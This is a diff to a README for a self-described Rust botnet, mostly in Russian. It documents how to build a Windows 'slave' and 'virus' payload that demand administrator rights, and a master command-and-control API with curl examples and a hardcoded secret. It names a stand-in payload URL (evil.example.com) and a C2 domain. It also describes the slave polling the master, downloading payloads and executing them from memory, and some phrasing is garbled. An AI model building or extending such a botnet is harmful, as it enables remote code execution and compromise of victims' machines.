@@ -1,10 +1,14 @@
 > "botnet" is already cool enough
 
 ## Build
+#### slave (специальный манифест requireAdministrator через embed-manifest в `build.rs`)
+`cargo zigbuild --bin slave --release --target x86_64-pc-windows-gnu`
 #### virus(sample payload)
 `cargo zigbuild --bin virus --release --target x86_64-pc-windows-gnu`
 #### cook iso for VM 
 `xorriso -outdev output.iso -blank as_needed -map target/x86_64-pc-windows-gnu/release/virus.exe /virus.exe`
+
+> оба бина для windows получают встроенный манифест с `requireAdministrator` (см. `build.rs`) — при запуске exe Windows сам запросит повышение прав
 
 ## Master API (port 6767)
 
@@ -18,7 +22,7 @@ curl -s http://localhost:6767/poll
 
 ### `POST /virus_add` — новый вирус в очередь
 
-Секрет обязателен, иначе `401`. Ответ: `id = id последнего + 1`, статус `created`, `out = null`.
+Секрет обязателен, иначе `401`. Мастер хранит только `url` — то, что лежит по адресу, качает сам slave. Ответ: `id = id последнего + 1`, статус `created`, `out = null`.
 ```bash
 curl -s -X POST http://localhost:6767/virus_add \
   -H "Content-Type: application/json" \
@@ -70,3 +74,39 @@ python3 -c 'import sys,json; ip=sys.argv[1]; print(json.dumps({"id":1,"status":"
 ```
 
 Любой другой статус → `virus <id>: прислал хуйню <статус>`.
+
+### `POST /virus_remove` — удалить вирус по id
+
+Тот же секрет, что и у `virus_add`:
+```bash
+curl -s -X POST http://localhost:6767/virus_remove \
+  -H "Content-Type: application/json" \
+  -d '{"id": 1, "secret": "gazan67"}'
+```
+Ответы: `virus 1 removed` / `virus 1 not found in que`, неверный секрет → `401`.
+
+### `GET /list` — всё состояние мастера (`que` + `pro`)
+```bash
+curl -s http://localhost:6767/list
+```
+```json
+{"que":[{"id":1,"url":"http://evil.example.com/payload.bin","status":"created","out":null}],"pro":{"192.168.1.13":1}}
+```
+
+### `GET /pro` — где slave ищет себя
+```bash
+curl -s http://localhost:6767/pro
+```
+
+## Slave
+
+Адрес дидди — константа `MASTER = "http://master.impostorboy.ru"` в начале `src/slave.rs`.
+
+`/poll` ретраится при ошибке: экспоненциальный backoff 5 → 10 → 20 → ... сек (потолок — минутный интервал) до успеха, поэтому не пойманное дидди не ванну.
+
+Жизненный цикл на каждый вирус с наименьшим не занятым `id`:
+1. раз в минуту дёргает `GET /poll` и берёт оттуда вирус с наименьшим `id` со статусом `created`2. сразу шлёт `POST /virus_status` со статусом `accepted` и своим IP в `out`
+3. скачивает payload с `virus.url` и исполняет из памяти через maple
+4. **только после исполнения** идёт в `GET /pro` и ищет себя по своему IP; если мастера так и не записал `ip -> id` — перепосылаем `accepted` и проверяем ещё раз
+
+Всё под `tokio::spawn` — не тормозим следующий poll.
